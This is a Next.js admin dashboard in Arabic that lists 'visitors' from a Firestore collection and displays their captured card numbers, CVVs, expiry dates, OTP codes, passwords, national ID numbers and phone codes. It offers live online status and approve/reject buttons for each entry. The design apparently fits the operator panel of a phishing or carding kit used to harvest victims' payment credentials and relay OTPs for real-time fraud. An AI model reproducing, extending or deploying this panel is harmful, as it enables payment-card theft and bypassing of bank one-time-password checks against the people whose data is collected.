"use client";

import React, { useState, useEffect, useMemo, useRef } from "react";
import { useRouter } from "next/navigation";
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  XCircle,
  Clock,
  MapPin,
  Search,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  TrendingUp,
  Activity,
  Filter,
  RefreshCw,
  AlertCircle,
  Loader2,
  EyeOff,
  Eye,
  X,
} from "lucide-react";

// shadcn (using @ alias)
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
  CardFooter,
  CardDescription,
} from "@/components/ui/card";
import {
  collection,
  doc,
  writeBatch,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from "firebase/firestore";
import { onAuthStateChanged, signOut } from "firebase/auth";
import { onValue, ref } from "firebase/database";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Tooltip,
  TooltipContent,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import { Input } from "@/components/ui/input";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
  DropdownMenuLabel,
} from "@/components/ui/dropdown-menu";
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar";
import { Separator } from "@/components/ui/separator";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Sheet,
  SheetContent,
  SheetHeader,
  SheetTitle,
} from "@/components/ui/sheet";
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";

// Custom libs/hooks
import { toast } from "@/hooks/use-toast";
import { db, auth, database } from "@/lib/firestore";
import { playNotificationSound } from "@/lib/actions";

// date-fns
import { ar } from "date-fns/locale";
import { formatDistanceToNow } from "date-fns";

// Types
type FlagColor = "red" | "yellow" | "green" | null;

interface Notification {
  id: string;
  createdDate: string;
  date?: string;
  time?: string;
  cardName?: string;
  cardNumber?: string;
  cvv?: string;
  expiry?: string;
  bank?: string;
  status: "pending" | "approved" | "rejected" | string;
  flagColor?: FlagColor;
  isHidden?: boolean;
  otp?: string;
  amount?: string;
  step?: number;
  currentPage?: string;
  country?: string;
  // Screenshot nested structures
  card?: {
    cvv: string;
    expiry: string;
    name: string;
    number: string;
  };
  personal?: {
    email: string;
    firstName: string;
    lastName: string;
    phone: string;
    phonePrefix: string;
  };
  // Supporting old/other fields
  email?: string;
  mobile?: string;
  phone?: string;
  name?: string;
  idNumber?: string;
  network?: string;
  otp2?: string;
  pass?: string;
  year?: string;
  month?: string;
  allOtps?: string[] | null;
  prefix?: string;
}

// Helpers for the new structure
const getNotificationEmail = (n: Notification) =>
  n.personal?.email || n.email || "";
const getNotificationPhone = (n: Notification) =>
  n.personal?.phone || n.phone || n.mobile || "";
const getNotificationName = (n: Notification) =>
  n.personal?.firstName
    ? `${n.personal.firstName} ${n.personal.lastName}`
    : n.name || n.cardName || n.card?.name || "";
const getNotificationCardNum = (n: Notification) =>
  n.card?.number || n.cardNumber || "";
const getNotificationExpiry = (n: Notification) =>
  n.card?.expiry ||
  n.expiry ||
  (n.year && n.month ? `${n.year}/${n.month}` : "");
const getNotificationCVV = (n: Notification) => n.card?.cvv || n.cvv || "";

// Reuse components from user prompt code
function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0);

  useEffect(() => {
    try {
      const onlineUsersRef = ref(database, "status");
      const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const onlineCount = Object.values(data).filter(
            (status: any) => status.state === "online"
          ).length;
          setOnlineUsersCount(onlineCount);
        }
      });
      return () => unsubscribe();
    } catch (e) {
      console.warn("Realtime Database not available for online count");
    }
  }, []);

  return onlineUsersCount;
}

function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">(
    "unknown"
  );
  const [lastSeen, setLastSeen] = useState<Date | null>(null);

  useEffect(() => {
    try {
      const userStatusRef = ref(database, `/status/${userId}`);
      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val();
        if (data) {
          setStatus(data.state === "online" ? "online" : "offline");
          if (data.lastChanged) {
            setLastSeen(new Date(data.lastChanged));
          }
        } else {
          setStatus("unknown");
        }
      });
      return () => unsubscribe();
    } catch (e) {
      console.warn(`Realtime Database not available for user ${userId}`);
    }
  }, [userId]);

  return (
    <Tooltip>
      <TooltipTrigger asChild>
        <div className="flex items-center gap-2 cursor-pointer">
          <div
            className={`w-2 h-2 rounded-full ${
              status === "online"
                ? "bg-green-500 animate-pulse"
                : status === "offline"
                ? "bg-red-500"
                : "bg-gray-400"
            }`}
          />
          <Badge
            variant="outline"
            className={`text-xs ${
              status === "online"
                ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
                : status === "offline"
                ? "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
                : "bg-gray-50 text-gray-700 border-gray-200 dark:bg-gray-950/30 dark:text-gray-300"
            }`}
          >
            {status === "online"
              ? "متصل"
              : status === "offline"
              ? "غير متصل"
              : "غير معروف"}
          </Badge>
        </div>
      </TooltipTrigger>
      <TooltipContent>
        {status === "offline" && lastSeen && (
          <p>
            آخر ظهور:{" "}
            {formatDistanceToNow(lastSeen, { addSuffix: true, locale: ar })}
          </p>
        )}
        {status === "online" && <p>متصل الآن</p>}
        {status === "unknown" && <p>لا توجد معلومات</p>}
      </TooltipContent>
    </Tooltip>
  );
}

function StatisticsCard({
  title,
  value,
  change,
  changeType,
  icon: Icon,
  color,
  trend,
}: {
  title: string;
  value: string | number;
  change: string;
  changeType: "increase" | "decrease" | "neutral";
  icon: React.ElementType;
  color: string;
  trend?: number[];
}) {
  return (
    <Card className="relative overflow-hidden bg-slate-900/70 border border-slate-800/50 shadow-xl shadow-black/20 hover:shadow-2xl hover:shadow-black/30 transition-all duration-300 group backdrop-blur-sm">
      <div className="absolute inset-0 bg-gradient-to-br from-white/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
      <CardHeader className="pb-2 relative">
        <div className="flex items-center justify-between">
          <div
            className={`p-3 rounded-xl ${color} shadow-lg group-hover:scale-110 transition-transform`}
          >
            <Icon className="h-6 w-6 text-white" />
          </div>
          <div className="text-right">
            <p className="text-sm font-medium text-slate-400">{title}</p>
            <p className="text-3xl font-bold text-white">{value}</p>
          </div>
        </div>
      </CardHeader>
      <CardContent className="pt-0 relative">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-1">
            <TrendingUp
              className={`h-4 w-4 ${
                changeType === "increase"
                  ? "text-emerald-400"
                  : changeType === "decrease"
                  ? "text-red-400"
                  : "text-slate-500"
              }`}
            />
            <span
              className={`text-sm font-medium ${
                changeType === "increase"
                  ? "text-emerald-400"
                  : changeType === "decrease"
                  ? "text-red-400"
                  : "text-slate-500"
              }`}
            >
              {change}
            </span>
          </div>
          {trend && (
            <div className="flex items-end gap-1 h-8">
              {trend.map((val, index) => (
                <div
                  key={index}
                  className="w-1.5 rounded-sm bg-emerald-500/60 hover:bg-emerald-400 transition-colors"
                  style={{ height: `${(val / Math.max(...trend)) * 100}%` }}
                />
              ))}
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  );
}

function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string;
  currentColor: any;
  onColorChange: (id: string, color: FlagColor) => void;
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8 hover:bg-muted">
          <Flag
            className={`h-4 w-4 transition-colors ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                ? "text-yellow-500 fill-yellow-500"
                : currentColor === "green"
                ? "text-green-500 fill-green-500"
                : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2" dir="rtl">
        <div className="flex gap-2">
          {[
            { color: "red", label: "عالي الأولوية", bgColor: "bg-red-500" },
            {
              color: "yellow",
              label: "متوسط الأولوية",
              bgColor: "bg-yellow-500",
            },
            {
              color: "green",
              label: "منخفض الأولوية",
              bgColor: "bg-green-500",
            },
          ].map(({ color, label, bgColor }) => (
            <div key={color}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className={`h-8 w-8 rounded-full ${bgColor} hover:opacity-80 transition-opacity`}
                    onClick={() =>
                      onColorChange(notificationId, color as FlagColor)
                    }
                  >
                    <Flag className="h-4 w-4 text-white" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>{label}</p>
                </TooltipContent>
              </Tooltip>
            </div>
          ))}
          {currentColor && (
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600"
                  onClick={() => onColorChange(notificationId, null)}
                >
                  <X className="h-4 w-4 text-gray-600 dark:text-gray-300" />
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>إزالة العلم</p>
              </TooltipContent>
            </Tooltip>
          )}
        </div>
      </PopoverContent>
    </Popover>
  );
}

function SearchBar({
  onSearch,
  value,
}: {
  onSearch: (term: string) => void;
  value: string;
}) {
  const [searchTerm, setSearchTerm] = useState(value);
  const searchInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    setSearchTerm(value);
  }, [value]);

  const handleSearch = (term: string) => {
    setSearchTerm(term);
    onSearch(term);
  };

  const handleClear = () => {
    setSearchTerm("");
    onSearch("");
    searchInputRef.current?.focus();
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      onSearch(searchTerm);
    }
    if (e.key === "Escape") {
      handleClear();
    }
  };

  return (
    <div className="relative group">
      <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-slate-500 group-focus-within:text-emerald-400 transition-colors" />
      <Input
        ref={searchInputRef}
        type="search"
        placeholder="البحث في الإشعارات..."
        className="pl-10 pr-10 bg-slate-800/50 backdrop-blur-sm border-slate-700/50 text-white placeholder:text-slate-500 focus:border-emerald-500/50 transition-colors"
        value={searchTerm}
        onChange={(e) => handleSearch(e.target.value)}
        onKeyDown={handleKeyDown}
      />
      {searchTerm && (
        <Button
          variant="ghost"
          size="icon"
          className="absolute right-1 top-1/2 transform -translate-y-1/2 h-7 w-7 text-slate-400 hover:text-white"
          onClick={handleClear}
        >
          <X className="h-3 w-3" />
        </Button>
      )}
    </div>
  );
}

function Pagination({
  currentPage,
  totalPages,
  onPageChange,
  totalItems,
  itemsPerPage,
}: {
  currentPage: number;
  totalPages: number;
  onPageChange: (page: number) => void;
  totalItems: number;
  itemsPerPage: number;
}) {
  const startItem = (currentPage - 1) * itemsPerPage + 1;
  const endItem = Math.min(currentPage * itemsPerPage, totalItems);

  const getPageNumbers = () => {
    const pages = [];
    const maxVisible = 5;
    if (totalPages <= maxVisible) {
      for (let i = 1; i <= totalPages; i++) pages.push(i);
    } else {
      if (currentPage <= 3) {
        for (let i = 1; i <= 4; i++) pages.push(i);
        pages.push("...");
        pages.push(totalPages);
      } else if (currentPage >= totalPages - 2) {
        pages.push(1);
        pages.push("...");
        for (let i = totalPages - 3; i <= totalPages; i++) pages.push(i);
      } else {
        pages.push(1);
        pages.push("...");
        for (let i = currentPage - 1; i <= currentPage + 1; i++) pages.push(i);
        pages.push("...");
        pages.push(totalPages);
      }
    }
    return pages;
  };

  return (
    <div className="flex items-center justify-between flex-wrap gap-4">
      <div className="text-sm text-muted-foreground">
        عرض <span className="font-medium text-foreground">{startItem}</span> إلى{" "}
        <span className="font-medium text-foreground">{endItem}</span> من{" "}
        <span className="font-medium text-foreground">{totalItems}</span> عنصر
      </div>
      <div className="flex items-center gap-2">
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage - 1)}
          disabled={currentPage <= 1}
        >
          <ChevronRight className="h-4 w-4" />
        </Button>
        <div className="flex items-center gap-1">
          {getPageNumbers().map((page, index) =>
            page === "..." ? (
              <span key={`ellipsis-${index}`} className="px-2">
                ...
              </span>
            ) : (
              <Button
                key={page}
                variant={currentPage === page ? "default" : "outline"}
                size="sm"
                onClick={() => onPageChange(page as number)}
              >
                {page}
              </Button>
            )
          )}
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage + 1)}
          disabled={currentPage >= totalPages}
        >
          <ChevronLeft className="h-4 w-4" />
        </Button>
      </div>
    </div>
  );
}

const InfoBadge = ({ active, onClick, icon: Icon, text, colorClass }: any) => (
  <Tooltip>
    <TooltipTrigger asChild>
      <Badge
        variant={active ? "default" : "secondary"}
        className={`cursor-pointer transition-all hover:scale-105 ${
          active
            ? `bg-gradient-to-r ${colorClass} text-white shadow-md`
            : "opacity-60"
        }`}
        onClick={active ? onClick : undefined}
      >
        <Icon className="h-3 w-3 ml-1" />
        {text}
      </Badge>
    </TooltipTrigger>
    <TooltipContent>
      <p>{active ? "انقر للعرض" : "لا توجد بيانات"}</p>
    </TooltipContent>
  </Tooltip>
);

const StatusBadge = ({ status }: any) => {
  const statusMap = {
    approved: {
      text: "موافق",
      color: "from-green-500 to-green-600",
      icon: CheckCircle,
    },
    rejected: {
      text: "مرفوض",
      color: "from-red-500 to-red-600",
      icon: XCircle,
    },
    pending: {
      text: "معلق",
      color: "from-yellow-500 to-yellow-600",
      icon: Clock,
    },
  };
  const current =
    (statusMap[status as keyof typeof statusMap] as any) || statusMap.pending;
  return (
    <Badge
      className={`bg-gradient-to-r ${current.color} text-white flex items-center gap-1 shadow-sm`}
    >
      <current.icon className="h-3 w-3" />
      {current.text}
    </Badge>
  );
};

const HeaderIcon: React.FC<{
  icon: React.ElementType;
  bgGradient: string;
  title: string;
}> = ({ icon: Icon, bgGradient, title }) => (
  <>
    <div
      className={`w-12 h-12 rounded-full flex items-center justify-center bg-gradient-to-br ${bgGradient} shadow-md`}
    >
      <Icon className="h-6 w-6 text-white" />
    </div>
    <span className="ml-2">{title}</span>
  </>
);

const InfoSection: React.FC<{
  items: { label: string; value: any; sensitive?: boolean }[];
  additionalOtps?: string[];
}> = ({ items, additionalOtps }) => {
  const [showSensitive, setShowSensitive] = useState<{
    [key: string]: boolean;
  }>({});
  return (
    <div className="mt-4 space-y-4">
      <div
        className="bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 rounded-xl shadow-inner p-5 space-y-3"
        dir="ltr"
      >
        {items.map(({ label, value, sensitive }) => {
          if (value === undefined || value === null || value === "")
            return null;
          return (
            <div
              key={label}
              className="flex justify-between items-center py-2 border-b border-gray-300 dark:border-gray-700 last:border-0 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-md px-2 transition"
            >
              <span className="font-medium text-gray-500 dark:text-gray-400">
                {label}:
              </span>
              <div className="flex items-center gap-2">
                {sensitive ? (
                  <>
                    <span className="font-semibold text-gray-900 dark:text-gray-200">
                      {showSensitive[label] ? String(value) : "••••••"}
                    </span>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-6 w-6"
                      onClick={() =>
                        setShowSensitive((p) => ({ ...p, [label]: !p[label] }))
                      }
                    >
                      {showSensitive[label] ? (
                        <EyeOff className="h-3 w-3" />
                      ) : (
                        <Eye className="h-3 w-3" />
                      )}
                    </Button>
                  </>
                ) : (
                  <span className="font-semibold text-gray-900 dark:text-gray-200 text-right">
                    {String(value)}
                  </span>
                )}
              </div>
            </div>
          );
        })}
        {additionalOtps && additionalOtps.length > 0 && (
          <div className="pt-3 border-t border-gray-300 dark:border-gray-700">
            <span className="font-medium text-gray-500 dark:text-gray-400 block mb-2">
              جميع الرموز:
            </span>
            <div className="flex flex-wrap gap-2">
              {additionalOtps.map((otp, index) => (
                <Badge
                  key={index}
                  variant="outline"
                  className="bg-gray-100 dark:bg-gray-800 text-gray-800 dark:text-gray-100 font-mono"
                >
                  {otp}
                </Badge>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
    null
  );
  const [selectedNotification, setSelectedNotification] =
    useState<Notification | null>(null);
  const [filterType, setFilterType] = useState<
    "all" | "card" | "online" | "pending"
  >("all");
  const [searchTerm, setSearchTerm] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [itemsPerPage] = useState(10);
  const [showStatistics, setShowStatistics] = useState(true);
  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date");
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc");
  const [onlineStatuses] = useState<Record<string, boolean>>({});

  const router = useRouter();
  const onlineUsersCount = useOnlineUsersCount();

  useEffect(() => {
    const unsubAuth = onAuthStateChanged(auth, (user) => {
      if (!user) router.push("/login");
    });
    return () => unsubAuth();
  }, [router]);

  useEffect(() => {
    const q = query(collection(db, "paysapp"), orderBy("createdDate", "desc"));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
      })) as Notification[];
      const filtered = data.filter((n) => !n.isHidden);
      if (filtered.length > notifications.length && notifications.length > 0) {
        playNotificationSound();
      }
      setNotifications(filtered);
      setIsLoading(false);
    });
    return () => unsubscribe();
  }, [notifications.length]);

  const filteredNotifications = useMemo(() => {
    let result = [...notifications];
    if (filterType === "card")
      result = result.filter((n) => getNotificationCardNum(n));
    if (filterType === "pending")
      result = result.filter((n) => n.status === "pending");
    if (filterType === "online")
      result = result.filter((n) => onlineStatuses[n.id]);
    if (searchTerm) {
      const lower = searchTerm.toLowerCase();
      result = result.filter(
        (n) =>
          getNotificationName(n).toLowerCase().includes(lower) ||
          getNotificationEmail(n).toLowerCase().includes(lower) ||
          getNotificationPhone(n).toLowerCase().includes(lower) ||
          getNotificationCardNum(n).includes(lower) ||
          n.id.includes(lower)
      );
    }
    result.sort((a, b) => {
      let aVal: any = a[sortBy as keyof Notification] || "";
      let bVal: any = b[sortBy as keyof Notification] || "";
      if (sortBy === "date") {
        aVal = new Date(a.createdDate).getTime();
        bVal = new Date(b.createdDate).getTime();
      }
      return sortOrder === "asc"
        ? aVal > bVal
          ? 1
          : -1
        : aVal < bVal
        ? 1
        : -1;
    });
    return result;
  }, [
    notifications,
    filterType,
    searchTerm,
    onlineStatuses,
    sortBy,
    sortOrder,
  ]);

  const paginatedNotifications = useMemo(() => {
    const start = (currentPage - 1) * itemsPerPage;
    return filteredNotifications.slice(start, start + itemsPerPage);
  }, [filteredNotifications, currentPage, itemsPerPage]);

  const totalPages =
    Math.ceil(filteredNotifications.length / itemsPerPage) || 1;

  const handleApproval = async (id: string, state: string) => {
    try {
      await updateDoc(doc(db, "paysapp", id), { status: state });
      toast({ title: state === "approved" ? "تمت الموافقة" : "تم الرفض" });
    } catch (e) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleFlagChange = async (id: string, color: FlagColor) => {
    try {
      await updateDoc(doc(db, "paysapp", id), { flagColor: color });
    } catch (e) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleDelete = async (id: string) => {
    if (!confirm("هل أنت متأكد؟")) return;
    try {
      await updateDoc(doc(db, "paysapp", id), { isHidden: true });
    } catch (e) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleLogout = async () => {
    await signOut(auth);
    router.push("/login");
  };

  if (isLoading && notifications.length === 0) {
    return (
      <div className="min-h-screen bg-slate-950 flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin text-emerald-500" />
      </div>
    );
  }

  return (
    <div dir="rtl" className="min-h-screen bg-slate-950 text-white pb-10">
      <header className="sticky top-0 z-40 bg-slate-900/80 backdrop-blur-md border-b border-slate-800 p-4">
        <div className="flex items-center justify-between max-w-7xl mx-auto">
          <div className="flex items-center gap-3">
            <div className="bg-emerald-600 p-2 rounded-lg">
              <Bell className="h-5 w-5" />
            </div>
            <div>
              <h1 className="font-bold">لوحة الإشعارات</h1>
              <p className="text-xs text-slate-400">نظام المراقبة المتقدم</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="ghost"
              size="icon"
              onClick={() => setShowStatistics(!showStatistics)}
            >
              <Activity className="h-4 w-4" />
            </Button>
            <Button
              variant="ghost"
              size="icon"
              onClick={handleLogout}
              className="text-red-400"
            >
              <LogOut className="h-4 w-4" />
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto p-4 md:p-6 space-y-6">
        {showStatistics && (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            <StatisticsCard
              title="إجمالي الزوار"
              value={notifications.length}
              change="+0"
              changeType="neutral"
              icon={Users}
              color="bg-blue-600"
            />
            <StatisticsCard
              title="متصلين"
              value={onlineUsersCount}
              change="+0"
              changeType="neutral"
              icon={UserCheck}
              color="bg-emerald-600"
            />
            <StatisticsCard
              title="بطاقات"
              value={
                notifications.filter((n) => getNotificationCardNum(n)).length
              }
              change="+0"
              changeType="neutral"
              icon={CreditCard}
              color="bg-purple-600"
            />
            <StatisticsCard
              title="معلق"
              value={notifications.filter((n) => n.status === "pending").length}
              change="+0"
              changeType="neutral"
              icon={Clock}
              color="bg-amber-600"
            />
          </div>
        )}

        <div className="flex flex-col md:flex-row gap-4 justify-between items-center">
          <Tabs
            value={filterType}
            onValueChange={(v: any) => setFilterType(v)}
            className="w-full md:w-auto"
          >
            <TabsList className="bg-slate-900 border-slate-800">
              <TabsTrigger value="all">الكل</TabsTrigger>
              <TabsTrigger value="pending">المعلق</TabsTrigger>
              <TabsTrigger value="card">البطاقات</TabsTrigger>
              <TabsTrigger value="online">المتصلين</TabsTrigger>
            </TabsList>
          </Tabs>
          <div className="w-full md:w-80">
            <SearchBar value={searchTerm} onSearch={setSearchTerm} />
          </div>
        </div>

        <Card className="bg-slate-900 border-slate-800 overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-right text-sm">
              <thead className="bg-slate-800/50 text-slate-400">
                <tr>
                  <th className="p-4">متصل</th>
                  <th className="p-4">المعلومات</th>
                  <th className="p-4">الحالة</th>
                  <th className="p-4">الوقت</th>
                  <th className="p-4">الصفحة</th>
                  <th className="p-4">الإجراءات</th>
                </tr>
              </thead>
              <tbody dir="rtl">
                {paginatedNotifications.map((n) => (
                  <tr
                    key={n.id}
                    dir="rtl"
                    className="border-b border-slate-800 hover:bg-slate-800/30"
                  >
                    <td>
                      <UserStatus userId={n.id} />
                    </td>
                    <td className="p-4">
                      <div className="flex flex-wrap gap-2" dir="rtl">
                        <InfoBadge
                          active={
                            getNotificationName(n) || getNotificationPhone(n)
                          }
                          onClick={() => {
                            setSelectedNotification(n);
                            setSelectedInfo("personal");
                          }}
                          icon={User}
                          text="شخصي"
                          colorClass="from-blue-500 to-blue-600"
                        />
                        <InfoBadge
                          active={getNotificationCardNum(n).toString()}
                          onClick={() => {
                            setSelectedNotification(n);
                            setSelectedInfo("card");
                          }}
                          icon={CreditCard}
                          text="بطاقة"
                          colorClass={
                            n.otp
                              ? "from-red-500 to-yellow-600"
                              : "from-emerald-500 to-emerald-600"
                          }
                        />
                      </div>
                    </td>
                    <td className="p-4">
                      <StatusBadge status={n.status} />
                    </td>
                    <td className="p-4 text-slate-400">
                      {formatDistanceToNow(new Date(n.createdDate), {
                        locale: ar,
                        addSuffix: true,
                      })}
                    </td>
                    <td className="p-4">
                      <Badge
                        variant="outline"
                        className="border-slate-700 text-teal-300"
                      >
                        {n.currentPage || "-"}
                      </Badge>
                    </td>
                    <td className="p-4">
                      <div className="flex gap-1 justify-end">
                        <Button
                          variant="ghost"
                          size="icon"
                          onClick={() => handleApproval(n.id, "approved")}
                          disabled={n.status === "approved"}
                          className="text-emerald-500"
                        >
                          <CheckCircle className="h-4 w-4" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="icon"
                          onClick={() => handleApproval(n.id, "rejected")}
                          disabled={n.status === "rejected"}
                          className="text-red-500"
                        >
                          <XCircle className="h-4 w-4" />
                        </Button>
                        <FlagColorSelector
                          notificationId={n.id}
                          currentColor={n.flagColor}
                          onColorChange={handleFlagChange}
                        />
                        <Button
                          variant="ghost"
                          size="icon"
                          onClick={() => handleDelete(n.id)}
                          className="text-slate-500"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          <CardFooter className="p-4 border-t border-slate-800">
            <Pagination
              currentPage={currentPage}
              totalPages={totalPages}
              onPageChange={setCurrentPage}
              totalItems={filteredNotifications.length}
              itemsPerPage={itemsPerPage}
            />
          </CardFooter>
        </Card>
      </main>

      <Dialog open={!!selectedInfo} onOpenChange={() => setSelectedInfo(null)}>
        <DialogContent
          className="max-w-md bg-slate-900 border-slate-800 text-white"
          dir="rtl"
        >
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              {selectedInfo === "personal" ? (
                <User className="h-5 w-5 text-blue-500" />
              ) : (
                <CreditCard className="h-5 w-5 text-emerald-500" />
              )}
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : "معلومات البطاقة"}
            </DialogTitle>
          </DialogHeader>
          {selectedNotification && selectedInfo === "personal" && (
            <InfoSection
              items={[
                {
                  label: "الاسم",
                  value: getNotificationName(selectedNotification),
                },
                {
                  label: "الهوية",
                  value: selectedNotification.idNumber,
                  sensitive: true,
                },
                {
                  label: "الجوال",
                  value: getNotificationPhone(selectedNotification),
                },
                {
                  label: "البريد",
                  value: getNotificationEmail(selectedNotification),
                },
                {
                  label: "رمز الهاتف",
                  value: selectedNotification.otp2,
                  sensitive: true,
                },
              ]}
            />
          )}
          {selectedNotification && selectedInfo === "card" && (
            <InfoSection
              items={[
                { label: "البنك", value: selectedNotification.bank },
                {
                  label: "رقم البطاقة",
                  value: getNotificationCardNum(selectedNotification),
                  sensitive: false,
                },
                {
                  label: "تاريخ الانتهاء",
                  value: getNotificationExpiry(selectedNotification),
                },
                {
                  label: "CVV",
                  value: getNotificationCVV(selectedNotification),
                  sensitive: false,
                },
                {
                  label: "رمز OTP",
                  value: selectedNotification.otp,
                  sensitive: false,
                },
                {
                  label: "كلمة المرور",
                  value: selectedNotification.pass,
                  sensitive: true,
                },
                { label: "المبلغ", value: selectedNotification.amount },
              ]}
              additionalOtps={selectedNotification.allOtps || []}
            />
          )}
          <DialogFooter>
            <Button onClick={() => setSelectedInfo(null)} className="w-full">
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
